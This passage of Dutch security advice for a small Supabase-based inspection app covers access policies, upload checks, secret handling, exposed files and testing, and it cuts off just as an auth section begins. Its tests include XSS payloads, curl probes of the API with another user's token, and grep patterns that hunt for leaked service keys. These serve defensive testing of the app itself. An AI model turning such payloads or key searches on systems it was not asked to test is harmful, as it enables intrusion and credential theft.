In een SPA zijn routes en schermen alleen client-side. Een inspecteur kan via devtools of een directe URL het beheerscherm openen. Zonder server-side controle kan hij met de publieke anon-key en zijn eigen JWT rechtstreeks PostgREST aanroepen: monteurs wijzigen, doelen aanpassen, alle inspecties exporteren of foto’s opvragen. Dat raakt AVG-gevoelige data (namen, foto’s van personen). Ook een rolwijziging in een slecht beveiligde `profiles`-tabel is dan mogelijk. Daarnaast vergroot de huidige CSP met `unsafe-inline` en inline `onclick` het XSS-risico: een XSS in een hoofdsessie kan beheer-API’s namens het hoofd aanroepen. RLS is daarom de primaire grens; CSP is defense-in-depth.

### 2. Wat Supabase en hosting wél en niet regelen
Supabase Auth regelt login, JWT-ondertekening, wachtwoordhashing, e-mailbevestiging en enige rate-limiting. PostgREST handhaaft RLS **als** RLS aan staat. Storage handhaaft policies op `storage.objects`. Hosting regelt TLS en statische levering. Supabase zet RLS **niet** automatisch aan op nieuwe tabellen; de standaard grants op `public` zijn ruim. CORS is geen beveiligingsgrens. `auth.users` is niet via RLS te beheren; gebruikersbeheer vereist de service-role en dus een server-side functie of het dashboard. Zet de service-role key nooit in de client.

### 3. Concrete maatregelen

**Rol in `app_metadata`, niet in `user_metadata`.** Alleen de Admin API/service-role kan dit zetten. Voorbeeld (eenmalig via SQL/dashboard):
```sql
update auth.users
set raw_app_meta_data = coalesce(raw_app_meta_data,'{}'::jsonb) || '{"role":"hoofd"}'::jsonb
where email = 'hoofd@noardling.nl';
```

**Helperfuncties:**
```sql
create or replace function public.jwt_role() returns text
language sql stable as $$
  select coalesce(auth.jwt() -> 'app_metadata' ->> 'role', 'anon');
$$;

create or replace function public.is_hoofd() returns boolean
language sql stable as $$ select public.jwt_role() = 'hoofd'; $$;
```

**RLS aan en policies per tabel.** Voorbeeld monteurs (lezen mag ingelogd, schrijven alleen hoofd):
```sql
alter table public.monteurs enable row level security;

create policy monteurs_select on public.monteurs
  for select to authenticated using (true);

create policy monteurs_insert on public.monteurs
  for insert to authenticated with check (public.is_hoofd());

create policy monteurs_update on public.monteurs
  for update to authenticated using (public.is_hoofd()) with check (public.is_hoofd());

create policy monteurs_delete on public.monteurs
  for delete to authenticated using (public.is_hoofd());
```
Doe hetzelfde voor `doelen`. Voor `inspecties` bijvoorbeeld:
```sql
create policy inspecties_select on public.inspecties
  for select to authenticated
  using (public.is_hoofd() or public.jwt_role() = 'coordinator' or inspecteur_id = auth.uid());
```
Voor `profiles`: eigen rij lezen, hoofd alles; voorkom dat iemand `role` wijzigt:
```sql
revoke update(role) on public.profiles from authenticated;
```

**Export alleen voor hoofd via RPC:**
```sql
create or replace function public.export_inspecties()
returns setof public.inspecties
language plpgsql security definer set search_path = public as $$
begin
  if not public.is_hoofd() then
    raise exception 'forbidden' using errcode = '42501';
  end if;
  return query select * from public.inspecties;
end; $$;

revoke all on function public.export_inspecties() from public, anon;
grant execute on function public.export_inspecties() to authenticated;
```

**Storage (privé bucket `inspectie-fotos`):**
```sql
create policy fotos_insert on storage.objects for insert to authenticated
with check (bucket_id = 'inspectie-fotos'
  and (storage.foldername(name))[1] = auth.uid()::text);

create policy fotos_select on storage.objects for select to authenticated
using (bucket_id = 'inspectie-fotos'
  and (public.is_hoofd() or owner = auth.uid()));
```

**Grants opschonen:**
```sql
revoke all on all tables in schema public from anon;
grant select, insert, update, delete on all tables in schema public to authenticated;
```
RLS filtert daarna de rijen.

**Supabase-instellingen:** zet signup uit, e-mailbevestiging aan, JWT-expiry kort (bijv. 3600s), RLS op nieuwe tabellen aan, buckets privé. Gebruikersbeheer voor 5 personen: doe dat via het dashboard; in-app user management vereist een Edge Function met service-role en rolcheck.

**CSP/`_headers` (Netlify/Cloudflare):**
```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://*.supabase.co; connect-src 'self' https://*.supabase.co; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
  X-Frame-Options: DENY
  Referrer-Policy: no-referrer
  X-Content-Type-Options: nosniff
```
Eerlijk: dit werkt pas nadat je alle inline `onclick` hebt vervangen door `addEventListener`/event delegation. Anders moet `script-src` `'unsafe-inline'` houden en is de XSS-bescherming beperkt.

**JS-routeguard (alleen UX):**
```js
async function requireHoofd() {
  const { data: { session } } = await supabase.auth.getSession();
  if (session?.user?.app_metadata?.role !== 'hoofd') {
    location.hash = '#/geen-toegang';
    return false;
  }
  return true;
}
```
Vertaal een 403 van de API altijd naar “geen toegang”; vertrouw nooit op de guard.

### 4. Testen
Maak een testinspecteur. Log in incognito, open de admin-URL: de UI blokkeert. Test daarna de API met curl:
```bash
curl -i -X POST "https://PROJECT.supabase.co/rest/v1/monteurs" \
 -H "apikey: $ANON" -H "Authorization: Bearer $INSPECTEUR_JWT" \
 -H "Content-Type: application/json" -d '{"naam":"test"}'
```
Verwacht: 401/403 of RLS-fout. Herhaal voor GET/PATCH/DELETE op `monteurs`, `doelen`, `profiles`. Test `rpc/export_inspecties` → 403. Test storage-upload naar andermans map → 403. Test anon zonder JWT → geen data. Test dat de inspecteur zijn `app_metadata` niet kan wijzigen. Grep op `service_role` in `webapp/`. Test CSP in de browserconsole en via securityheaders.com.

### 5. Niet van toepassing / overkill
Client-side route guards en verborgen knoppen zijn geen beveiliging, alleen UX. CORS is geen grens; Supabase staat origins ruim toe. CSRF is niet van toepassing zolang je Bearer-tokens in de `Authorization`-header gebruikt en geen cookie-auth. IP-allowlisting is onpraktisch voor mobiele inspecteurs. Een apart admin-subdomain of Edge Function voor alle beheer is overkill; RLS + RPC volstaat. `auth.users` beveiligen met RLS kan niet; gebruik `profiles`. Volledige CSP zonder `unsafe-inline` kan niet zonder refactor van de inline handlers — doe die refactor, maar claim niet dat het al opgelost is.

===== 09-uploads =====
## 1. Risico voor déze app

De foto's kunnen personen en woningen tonen, en het pad/de metadata kan locatie en monteursnamen prijsgeven — dat is direct AVG-relevant. Het grootste technische risico is niet "een virus" maar **datastoring**: een publieke bucket of een lange signed URL die in logs/referrers/historie belandt, of EXIF-GPS die de inspectielocatie verraadt. Daarnaast: de app draait met CSP `unsafe-inline` en Supabase-JWT's staan standaard in `localStorage`. Een stored-XSS via een geüpload bestand zou tokens kunnen stelen — maar Supabase serveert storage-objecten vanaf `<project>.supabase.co`, **niet** vanaf je app-origin, dus dat dempt dit risico sterk. Toch: geen publieke bucket, korte signed URLs, en `nosniff` blijven nodig.

## 2. Wat Supabase/hosting al regelt (en niet)

Supabase Storage: buckets zijn **private by default**; `storage.objects` heeft RLS aan (je moet zelf policies maken); per-bucket `file_size_limit` en `allowed_mime_types` worden afgedwongen; signed URLs met TTL bestaan. **Niet**: geen virusscan, geen EXIF-strip, geen magic-byte-validatie (het vertrouwt de `Content-Type` die de client meestuurt), geen automatische `X-Content-Type-Options: nosniff` op storage-responses. Netlify/Vercel/CF Pages regelen TLS en statische hosting, maar **geen** security headers tenzij je `_headers`/`vercel.json` instelt. `frame-ancestors` en `X-Frame-Options` kunnen niet in een `<meta>`-CSP — die moeten uit een header komen.

## 3. Maatregelen

**Bucket (SQL):**
```sql
insert into storage.buckets (id, name, public, file_size_limit, allowed_mime_types)
values ('inspectie-fotos','inspectie-fotos', false, 5242880,
        array['image/jpeg','image/png','image/webp'])
on conflict (id) do update set public=false,
  file_size_limit=excluded.file_size_limit,
  allowed_mime_types=excluded.allowed_mime_types;
```

**RLS op `storage.objects`** (padconventie `{auth.uid()}/{uuid}.jpg`):
```sql
create policy "lezen: ingelogd" on storage.objects for select to authenticated
using (bucket_id='inspectie-fotos');

create policy "verwijderen: eigen of coord/hoofd" on storage.objects for delete to authenticated
using (bucket_id='inspectie-fotos' and (
  (storage.foldername(name))[1] = auth.uid()::text
  or exists (select 1 from public.profielen p
             where p.id=auth.uid() and p.rol in ('coordinator','hoofd'))));
```
Geen `insert`-policy voor `authenticated`: uploads lopen via een Edge Function met service-role, zodat magic-bytes en grootte daar gecontroleerd worden. `createSignedUrl` vereist de select-policy — die blijft dus nodig.

**Edge Function (magic bytes + proxy):**
```ts
// supabase/functions/upload-foto/index.ts
import { createClient } from 'jsr:@supabase/supabase-js@2'
Deno.serve(async (req) => {
  const sb = createClient(Deno.env.get('SUPABASE_URL')!, Deno.env.get('SUPABASE_ANON_KEY')!,
    { global: { headers: { Authorization: req.headers.get('Authorization') ?? '' } } })
  const { data: { user } } = await sb.auth.getUser()
  if (!user) return new Response('unauthorized', { status: 401 })
  const file = (await req.formData()).get('file') as File
  if (!file || file.size > 5_242_880) return new Response('te groot', { status: 413 })
  const b = new Uint8Array(await file.slice(0, 12).arrayBuffer())
  const ok =
    (file.type==='image/jpeg' && b[0]===0xFF && b[1]===0xD8 && b[2]===0xFF) ||
    (file.type==='image/png'  && b[0]===0x89 && b[1]===0x50 && b[2]===0x4E && b[3]===0x47) ||
    (file.type==='image/webp' && String.fromCharCode(...b.slice(0,4))==='RIFF'
                              && String.fromCharCode(...b.slice(8,12))==='WEBP')
  if (!ok) return new Response('ongeldig bestand', { status: 415 })
  const admin = createClient(Deno.env.get('SUPABASE_URL')!, Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!)
  const pad = `${user.id}/${crypto.randomUUID()}.${file.type.split('/')[1]}`
  const { error } = await admin.storage.from('inspectie-fotos')
    .upload(pad, file, { contentType: file.type, upsert: false })
  return error ? new Response(error.message, { status: 400 }) : Response.json({ pad })
})
```

**Client-side verkleinen + EXIF/GPS strippen** — canvas re-encodeert en gooit alle metadata weg:
```js
async function verklein(file, maxZij=1600, q=0.8) {
  const bmp = await createImageBitmap(file, { imageOrientation: 'from-image' })
  const s = Math.min(1, maxZij / Math.max(bmp.width, bmp.height))
  const c = new OffscreenCanvas(Math.round(bmp.width*s), Math.round(bmp.height*s))
  const ctx = c.getContext('2d')
  ctx.fillStyle='#fff'; ctx.fillRect(0,0,c.width,c.height)   // PNG-transparantie → wit
  ctx.drawImage(bmp, 0, 0, c.width, c.height)
  return c.convertToBlob({ type:'image/jpeg', quality:q })
}
```
HEIC van iPhone: niet in de allowlist; toon een melding ("zet camera op 'Meest compatibel'"). Dat is eerlijk beter dan halfsupport.

**Signed URL kort + geen referrer-lek:**
```js
const { data } = await supabase.storage.from('inspectie-fotos')
  .createSignedUrl(pad, 60)          // 60 s, genereer on-demand, nooit in DB opslaan
img.src = data.signedUrl
img.referrerPolicy = 'no-referrer'
```

**`_headers` (Netlify; Vercel: `vercel.json`):**
```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://<project>.supabase.co; connect-src 'self' https://<project>.supabase.co wss://<project>.supabase.co; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'self'
  X-Content-Type-Options: nosniff
  Referrer-Policy: no-referrer
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  Permissions-Policy: geolocation=(), microphone=()
```
`unsafe-inline` voor scripts kun je pas laten vallen als je de `onclick=`-handlers vervangt door `addEventListener` — dat is een refactor, geen quick win. Verwijder de meta-CSP of houd 'm identiek, anders verwar je jezelf.

## 4. Testen

- `curl -X POST .../upload-foto -H "Authorization: Bearer <jwt>" -F "file=@x.txt;type=image/jpeg"` → 415.
- Zelfde met 6 MB jpg → 413; met gif → 415 (bucket) of 415 (functie).
- `getPublicUrl()` op een bestaand pad → 400/403; `list()` met anon key → leeg.
- Signed URL na 61 s → 400.
- Download en `exiftool foto.jpg` → geen GPS/DateTimeOriginal.
- `curl -I https://app` → CSP/nosniff/frame-ancestors aanwezig; browserconsole zonder violations.
- RLS: met JWT van inspecteur A proberen object van B te verwijderen → 403.

## 5. Niet van toepassing / overkill

- **Virusscan (ClamAV/VirusTotal)**: overkill voor 5 gebruikers, alleen images, private bucket, geen uitvoerpad. VirusTotal is bovendien een **nee** (AVG: foto's met personen naar derde partij). Leg deze afweging schriftelijk vast in je DPIA.
- **Watermerken/DRM, rate limiting, CDN-caching van signed URLs**: niet nodig bij deze schaal.
- **Supabase Image Transformation**: leuk voor thumbnails, maar betaald; client-side verkleinen dekt het.
- **`camera=()` in Permissions-Policy**: blokkeert `getUserMedia`, niet `<input capture>` — laat staan zoals hierboven.

===== 10-secrets-git =====
## 1. Risico voor déze app

De anon key staat per definitie leesbaar in `webapp/js/*.js`. Dat is geen lek, mits RLS klopt. De echte risico's:

- **RLS vergeten.** Tabellen die je via de SQL-editor aanmaakt hebben standaard RLS *uit*. Met de publieke anon key kan dan iedereen met de project-URL alle inspecties, foto's en monteursnamen lezen en schrijven. Dit is het grootste reële risico — niet de key zelf.
- **`service_role` in de client.** Die omzeilt RLS volledig. Eén keer in een script = hele database open. Idem voor het JWT-secret.
- **OpenRouter-key in de client.** Directe kostendiefstal; browser-JS is leesbaar.
- **Git-historie.** Een key die je later uit een bestand haalt, staat nog in oude commits. Bij een publieke repo of fork is dat genoeg.

Zonder build-stap kun je niets in de client verbergen. Alles onder `webapp/` is publiek. Dat bepaalt het hele advies.

## 2. Wat Supabase/hosting al regelt

Wel: TLS/HSTS, Supabase Auth met JWT's, de anon key is ontworpen om publiek te zijn, private Storage-buckets met signed URLs, Edge Functions met secrets-store, en env-variabelen bij Netlify/Vercel/CF Pages die niet in statische bestanden belanden.

Niet: RLS staat niet automatisch aan; policies schrijf je zelf. De host beschermt je niet tegen een key die je zelf in je JS plakt. Git-hosting scant je historie niet. En een statische site heeft geen server-side plek voor geheimen — daarom moet OpenRouter via een Edge Function.

## 3. Maatregelen

**Alleen de anon key in de client.**
```bash
grep -rnE 'service_role|sk-or-v1-|SUPABASE_SERVICE' webapp/ && echo FOUT || echo ok
```

**RLS aan + policies.** Maak een `profielen`-tabel met `rol` en gebruik een `security definer`-functie om recursie te voorkomen:
```sql
alter table public.inspecties enable row level security;
alter table public.fotos enable row level security;

create or replace function public.mijn_rol()
returns text language sql stable security definer set search_path = public as
$$ select rol from public.profielen where id = auth.uid() $$;

create policy "eigen inspecties" on public.inspecties
  for all to authenticated
  using (inspecteur_id = auth.uid())
  with check (inspecteur_id = auth.uid());

create policy "coordinator leest alles" on public.inspecties
  for select to authenticated
  using (public.mijn_rol() in ('coordinator','hoofd'));
```
Storage-bucket `fotos` op **private**; policy op `storage.objects` die `(storage.foldername(name))[1] = auth.uid()::text` afdwingt. Client haalt signed URLs op, geen publieke URLs.

**OpenRouter via Edge Function.**
```ts
// supabase/functions/ai/index.ts
const key = Deno.env.get("OPENROUTER_API_KEY");
// verifieer eerst het JWT van de gebruiker, dan pas fetch naar OpenRouter
```
```bash
supabase secrets set OPENROUTER_API_KEY=sk-or-...
```
Client roept alleen `supabase.functions.invoke('ai', ...)` aan met het sessietoken.

**CSP via `_headers`** (meta-CSP kan geen `frame-ancestors`):
```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self' https://xxxx.supabase.co; img-src 'self' data: blob: https://xxxx.supabase.co; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'; base-uri 'self'
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
```
Eerlijk: `script-src 'self'` werkt pas als je alle `onclick=` vervangt door `addEventListener`. Dat is een refactor, maar de enige echte oplossing; een nonce kan niet op een statische host zonder build.

**Git-scan + pre-commit.**
```bash
# .git/hooks/pre-commit
#!/bin/sh
gitleaks protect --staged --redact --verbose || exit 1
```
CI: `gitleaks detect --source . --redact --exit-code 1`. TruffleHog als tweede net: `trufflehog git file://. --only-verified`. Snelle regex over de hele historie:
```bash
git rev-list --all | xargs -I{} git grep -nE 'sk-or-v1-|service_role|eyJhbGciOiJIUzI1NiIs' {} -- .
```
De anon key matcht dat laatste patroon ook — decodeer en check `"role":"anon"`.

**Periodiek (per kwartaal):** `supabase secrets list`, env-vars in Netlify/Vercel/CF doornemen, oude keys intrekken, bovenstaande grep + gitleaks herhalen.

**Bij een lek:** direct roteren. OpenRouter-key intrekken in het dashboard; Supabase `service_role`/JWT-secret opnieuw genereren (Dashboard → Settings → API). Let op: JWT-secret roteren maakt alle sessies ongeldig en verandert de anon key — iedereen moet opnieuw inloggen en je moet redeployen. Daarna historie opschonen met `git filter-repo`, force-push, en logs controleren op misbruik. Een key in een publieke fork blijft bestaan; roteren is de enige echte fix, niet verwijderen.

## 4. Testen

- `curl -s https://site/js/app.js | grep -E 'service_role|sk-or-'` → niets.
- Anon key decoderen: `cut -d. -f2 | base64 -d` → `"role":"anon"`.
- RLS: `curl "https://xxx.supabase.co/rest/v1/inspecties?select=*" -H "apikey: $ANON"` → `[]` of 401. Inloggen als inspecteur A en rij van B proberen te lezen → leeg. Insert met andermans `inspecteur_id` → 403.
- Storage: publieke URL van een foto → 400/403.
- Headers: `curl -I` en securityheaders.com.
- `gitleaks detect` lokaal en in CI.

## 5. Niet van toepassing

- De anon key versleutelen of obfuscaten: hij is publiek; RLS is de grens.
- Anon key in een env-var stoppen: geen build-stap, en het voegt niets toe.
- Anon key periodiek roteren: alleen bij vermoeden; het kost alle sessies.
- Vault/Secrets Manager voor 5 gebruikers: host-env-vars + Supabase secrets volstaan.
- IP-allowlisting op PostgREST: browsers hebben wisselende IP's.
- CSP-nonce: niet mogelijk op een statische host zonder build; refactor naar `addEventListener` is het alternatief.

===== 11-deps-exposed-debug =====
# Dependencies en blootgestelde bestanden — advies Noardling PWA

## 1. Risico voor déze app

De browser-code heeft geen npm-dependencies, dus klassieke supply-chain-aanvallen via `node_modules` zijn niet aan de orde. De reële risico's zijn anders:

- **CDN-fonts (Google Fonts)** lekken IP-adressen en User-Agent naar Google — een AVG-probleem bij een app die persoonsgegevens van monteurs verwerkt. Bovendien kan een gecompromitteerde CDN willekeurige CSS/JS injecteren.
- **Statische hosting publiceert standaard alles** in de publish-map. `docs/`, `tests/`, `supabase/seed.sql`, onderzoeksdocumenten en soms zelfs `.git/` kunnen per ongeluk meegaan en zijn dan wereldwijd opvraagbaar.
- **Debug-artefacten** (`console.log` met PII, testgebruikers, demo-data, voorbeeld-login) kunnen in productie staan en gevoelige data of omzeiling van auth blootleggen.
- **Dev-tooling** (scripts, seed-generatoren) heeft wél npm-deps; die moeten bewaakt worden.

## 2. Wat Supabase en hosting al regelen — en niet

**Supabase regelt:** TLS, Auth met rate limiting, PostgREST dat RLS respecteert *als je het aanzet*, Storage met signed URLs.

**Supabase regelt níet:** RLS staat **niet** standaard aan per tabel. Storage-buckets zijn standaard **public** als je dat bij aanmaken kiest. De anon key is publiek by design — RLS is je enige verdediging. Seed-bestanden worden nooit automatisch afgeschermd.

**Hosting regelt:** HTTPS/HSTS, vaak basis security headers. **Niet:** bescherming tegen per ongeluk publiceren van mappen, CSP, of het weren van `.git/` bij handmatige uploads.

## 3. Maatregelen

### 3a. Fonts self-hosten (AVG + supply chain)

Download de woff2-bestanden, zet ze in `webapp/fonts/`, en vervang de CDN-link:

```html
<!-- Fout -->
<link href="https://fonts.googleapis.com/css2?family=Inter" rel="stylesheet">

<!-- Goed -->
<link rel="stylesheet" href="/css/fonts.css">
```

```css
@font-face {
  font-family: 'Inter';
  src: url('/fonts/inter-var.woff2') format('woff2');
  font-display: swap;
}
```

Moet je tóch een CDN gebruiken (bv. supabase-js), voeg dan SRI toe: `integrity="sha384-..." crossorigin="anonymous"`.

### 3b. Publish-map beperken

Laat de hosting alleen `webapp/` publiceren:

```toml
# netlify.toml
[build]
  publish = "webapp"
```

```json
// vercel.json
{ "outputDirectory": "webapp" }
```

Cloudflare Pages: build output directory = `webapp`.

`.gitignore` (voor het geval je handmatig uploadt):

```
.git/
docs/
tests/
supabase/seed.sql
supabase/.temp/
*.md
!webapp/**/*.md
```

Defense-in-depth met `_headers` (Netlify + CF Pages):

```
/docs/*
  X-Robots-Tag: noindex
  Content-Security-Policy: default-src 'none'

/tests/*
  X-Robots-Tag: noindex
  Content-Security-Policy: default-src 'none'

/supabase/*
  X-Robots-Tag: noindex
  Content-Security-Policy: default-src 'none'
```

### 3c. Supabase RLS + private Storage

```sql
alter table public.inspecties enable row level security;
alter table public.fotos enable row level security;

create policy "inspecteur eigen data" on public.inspecties
  for all using (auth.uid() = inspecteur_id);

create policy "coordinator team" on public.inspecties
  for select using (
    exists (select 1 from public.profiles p
            where p.id = auth.uid() and p.rol in ('coordinator','hoofd'))
  );

insert into storage.buckets (id, name, public) values ('fotos','fotos', false);

create policy "eigen fotos" on storage.objects
  for select using (
    bucket_id = 'fotos' and (storage.foldername(name))[1] = auth.uid()::text
  );
```

### 3d. Debug uitzetten

```js
const IS_PROD = !['localhost','127.0.0.1'].includes(location.hostname);
if (IS_PROD) {
  console.log = console.debug = console.info = () => {};
  if (window.DEMO_MODE) throw new Error('DEMO_MODE in productie');
}
```

Testgebruikers horen in een **apart Supabase-project** of alleen in lokale seed — nooit in het productieproject.

### 3e. Dependabot voor tools

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/tools"
    schedule: { interval: "weekly" }
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule: { interval: "weekly" }
```

CI: `npm audit --omit=dev` in `tools/`. Verwijder ongebruikte packages met `npx depcheck`.

## 4. Testen

```bash
curl -I https://app.noardling.nl/docs/            # 404/403
curl -I https://app.noardling.nl/.git/config      # 404
curl -I https://app.noardling.nl/supabase/seed.sql # 404
curl -I https://app.noardling.nl/fonts/inter-var.woff2 # 200, eigen domein
```

- DevTools → Network: geen requests naar `fonts.googleapis.com`.
- Log in als inspecteur A, probeer via REST een inspectie van B op te halen → lege array of 403.
- Storage-URL zonder auth-token openen → 400/403.
- `grep -rn "console.log\|DEMO_MODE\|test@noardling" webapp/js/` in de gedeployde versie.
- Lighthouse → check security headers.

## 5. Niet van toepassing / overbodig

- **`npm audit` voor de app zelf**: er is geen `package.json` in `webapp/`; alleen `tools/` is relevant.
- **SRI op eigen scripts**: zelf gehost, dus geen CDN-risico.
- **CSP nonce/hash**: groter project (inline `onclick`-handlers moeten eerst weg); nu te veel werk voor de winst.
- **Dependabot voor browser-code**: n.v.t., geen dependencies.
- **`.git/` blokkeren via `_headers`**: alleen nodig als je handmatig uploadt; bij git-integratie wordt het niet meegedeployed — maar de publish-map-beperking dekt dit al af.

Eerlijk: de grootste winst zit in **publish-map beperken** en **RLS aanzetten**. De rest is defense-in-depth.

===== 12-review-test =====
## 1. Risico voor déze app

De grootste restrisico's zijn niet SQL-injectie (PostgREST parametriseert), maar **XSS via opgeslagen data** en **RLS-fouten**. De app schrijft inspectienotities, monteursnamen en acties weg en toont die later terug. Als dat via `innerHTML` gebeurt, voert een payload in bijvoorbeeld een notitieveld script uit in de browser van een coördinator. Door `script-src 'unsafe-inline'` (nodig voor je `onclick`) blokkeert de CSP dat niet. Omdat de Supabase anon-key publiek is, is **RLS de enige toegangsgrens**; één vergeten policy betekent dat elke ingelogde inspecteur alle inspecties en foto's kan lezen. Foto's kunnen personen tonen: dat is een AVG-risico met mogelijk datalekplicht. Ten slotte: rollen in `user_metadata` zijn door de gebruiker zelf aanpasbaar — gebruik die nooit voor autorisatie.

## 2. Wat Supabase/hosting wél en niet regelt

Supabase regelt: TLS, encryptie at rest, Postgres-backups (PITR op betaalde plannen), Auth met rate limiting, wachtwoordhashes, Storage-toegang via policies, en RLS-afdwinging in PostgREST. Het regelt **niet**: jouw rolmodel, inputvalidatie, output-encoding, CSP, auditlogging van data-access (pgaudit staat niet standaard aan), MFA-afdwinging, of het intrekken van accounts. Netlify/Vercel/Cloudflare regelen TLS en basis-DDoS, maar geen security headers tenzij je ze expliciet instelt. De `service_role`-key omzeilt RLS: die mag nooit in de frontend of in een publieke CI-variabele staan.

## 3. Maatregelen met code

**Rollen in een aparte tabel, niet in JWT-metadata:**

```sql
create table public.profiles (
  user_id uuid primary key references auth.users(id) on delete cascade,
  rol text not null check (rol in ('hoofd','coordinator','inspecteur')),
  actief boolean not null default true
);
alter table public.profiles enable row level security;
create policy "eigen profiel" on public.profiles
  for select to authenticated using (auth.uid() = user_id);

create or replace function public.mijn_rol() returns text
language sql stable security definer set search_path = public as $$
  select rol from public.profiles where user_id = auth.uid() and actief
$$;
revoke execute on function public.mijn_rol() from public, anon;
grant execute on function public.mijn_rol() to authenticated;

alter table public.inspecties enable row level security;
alter table public.inspecties force row level security;
create policy "lezen" on public.inspecties for select to authenticated
  using (inspecteur_id = auth.uid() or public.mijn_rol() in ('coordinator','hoofd'));
create policy "eigen invoer" on public.inspecties for insert to authenticated
  with check (inspecteur_id = auth.uid());
create policy "coordinator wijzigt" on public.inspecties for update to authenticated
  using (public.mijn_rol() in ('coordinator','hoofd'))
  with check (public.mijn_rol() in ('coordinator','hoofd'));
```

**Storage (bucket `fotos` privé, pad `fotos/<inspectie_id>/<bestand>`):**

```sql
create policy "foto lezen" on storage.objects for select to authenticated
using (bucket_id = 'fotos' and exists (
  select 1 from public.inspecties i
  where i.id::text = (storage.foldername(name))[1]
    and (i.inspecteur_id = auth.uid() or public.mijn_rol() in ('coordinator','hoofd'))
));
```

**Headers** (Netlify/Cloudflare Pages `_headers`; Vercel via `vercel.json`):

```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; connect-src 'self' https://<proj>.supabase.co wss://<proj>.supabase.co; img-src 'self' data: blob: https://<proj>.supabase.co; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'; report-uri https://<proj>.supabase.co/functions/v1/csp-report
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(self), geolocation=(self), microphone=()
```

Eerlijk: `'unsafe-inline'` blijft de zwakke plek. Een nonce toevoegen heeft geen zin zolang je inline `onclick` gebruikt (nonce geldt niet voor event-handlers). Refactor naar `addEventListener` en externe scripts, verwijder daarna `'unsafe-inline'`. Tot die tijd: **nooit `innerHTML` met gebruikersdata**:

```js
function toon(el, waarde){ el.textContent = String(waarde ?? ''); }
// fout: el.innerHTML = '<b>' + naam + '</b>';
```

**Supabase-instellingen:** signups uitschakelen (invite-only), e-mailbevestiging aan, minimale wachtwoordlengte 12, leaked-password protection aan, MFA verplicht voor hoofd/coordinator, JWT-expiry 3600s met refresh-rotation, redirect-URL's whitelisten, bucket privé met max 10 MB en MIME-whitelist, en `service_role` alleen server-side.

## 4. Testen

**Playwright** (alleen dev-tooling, niet in de app-bundle):

```js
const payloads = ['<img src=x onerror=alert(1)>', '"><svg onload=alert(1)>'];
for (const p of payloads) test(`XSS ${p}`, async ({ page }) => {
  let dialogs = 0; page.on('dialog', d => { dialogs++; d.dismiss(); });
  await page.addInitScript(() => { window.__csp = [];
    document.addEventListener('securitypolicyviolation', e => window.__csp.push(e.violatedDirective)); });
  await login(page); await page.fill('#notitie', p); await page.click('#opslaan');
  await page.reload();
  await expect(page.locator('#notitie')).toHaveText(p);
  expect(dialogs).toBe(0);
  expect(await page.evaluate(() => window.__csp)).toEqual([]);
});
```

**RLS via REST** (JWT per rol ophalen via `/auth/v1/token?grant_type=password`):

```bash
curl -s "$URL/rest/v1/inspecties?select=id" -H "apikey: $ANON" -H "Authorization: Bearer $JWT_A"
# verwacht: alleen eigen id's
curl -s -X PATCH "$URL/rest/v1/inspecties?id=eq.$ID_B" -H "apikey: $ANON" \
  -H "Authorization: Bearer $JWT_A" -H "Content-Type: application/json" -d '{"status":"afgerond"}'
# verwacht: lege array / 0 rijen; verifieer daarna dat rij B ongewijzigd is
```

**Headers:** `curl -sI https://app.example.nl/ | grep -Ei 'content-security|strict-transport|x-content-type|referrer|permissions'`.

## 5. Kwartaalchecklist en rapportformat

Checklist: accounts/vertrokken inspecteurs deactiveren; RLS- en Storage-policies reviewen; Auth-instellingen controleren; Playwright- en RLS-suite draaien; headers + CSP-reports bekijken; backup-restore testen; logs op failed logins/4xx/5xx; CDN-scripts met SRI en versie pinnen; ASVS L2-subset (V2 auth, V3 sessie, V4 toegang, V5 validatie, V7 logging, V8 data, V14 config).

Rapport: tabel met **ID | Bevinding | Risico (kans×impact, AVG ja/nee) | Fix | Bewijs (testnaam, curl-output, screenshot) | Status | Eigenaar | Deadline**. Voorbeeld: `SEC-07 | Inspecteur B kan foto's van A lezen | Hoog, AVG-datalek | Storage-policy corrigeren | RLS-test faalt, curl toont 200 met URL | Open | Dev | 2 weken`.

## 6. Niet van toepassing

CSRF-tokens: Supabase-JS gebruikt bearer-tokens in localStorage, geen cookies — XSS is hier het relevante risico. SQL-injectie-scanners: PostgREST parametriseert; RLS-tests zijn belangrijker. Volledige ASVS L3, driemaandelijkse pentest en WAF zijn voor 5 gebruikers overkill; doe een pentest jaarlijks of bij grote wijzigingen. `npm audit` is zinloos zonder dependencies, maar scan wél je CDN-scripts. DDoS-bescherming en encryptie at rest zijn providerzaken.

===== 01-auth =====
## 1) Risico voor déze app
De auth-laag is de enige poort tot inspecties, foto’s van personen, monteursnamen en planning. Drie concrete risico’s:
- **Open registratie of zwakke wachtwoorden** geven onbevoegden toegang tot persoonsgegevens.
- **XSS via `unsafe-inline`**: Supabase-JS bewaart de sessie standaard in `localStorage`. Een inline `onclick`-XSS kan het refresh token stelen en namens een hoofd/coordinator data opvragen.
- **Ontbrekende RLS**: PostgREST exposeert tabellen; zonder RLS kan een ingelogde inspecteur alles lezen. Ook een `service_role`-key in frontend is catastrofaal.

## 2) Wat Supabase/hosting standaard regelt
